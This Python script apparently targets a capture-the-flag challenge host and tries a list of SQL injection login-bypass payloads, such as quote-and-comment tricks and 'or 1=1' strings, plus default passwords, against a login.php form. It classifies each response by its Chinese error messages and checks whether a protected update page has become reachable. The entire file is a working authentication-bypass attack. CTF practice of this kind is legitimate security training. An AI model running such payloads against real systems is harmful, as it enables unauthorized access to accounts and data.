import requests

url = "http://38b5f744-d805-465d-9f56-30bcce267c94.node5.buuoj.cn:81"

# Test various SQL injection payloads
payloads = [
    ("admin", "admin"),
    ("admin", "123456"),
    ("admin' or '1'='1' -- -", "123"),
    ("admin'-- -", "123"),
    ("' or 1=1-- -", "123"),
    ("admin' or 1=1-- -", "123"),
    ("admin'/*", "*/or '1'='1"),
    # Try with URL encoding
]

s = requests.Session()

for username, password in payloads:
    r = s.post(f"{url}/login.php", data={"username": username, "password": password})
    print(f"User: {username[:30]}, Pass: {password[:30]}")
    if "密码错误" in r.text:
        print("  -> 密码错误")
    elif "用户不存在" in r.text:
        print("  -> 用户不存在")
    elif "hacker" in r.text:
        print("  -> Hacker detected")
    else:
        print("  -> Other response")
        print(r.text[:500])
    
    # Check if logged in
    r2 = s.get(f"{url}/index.php?action=update")
    if "你还没有登陆" not in r2.text:
        print("  -> Logged in!")
        print(r2.text)
        break
    print()
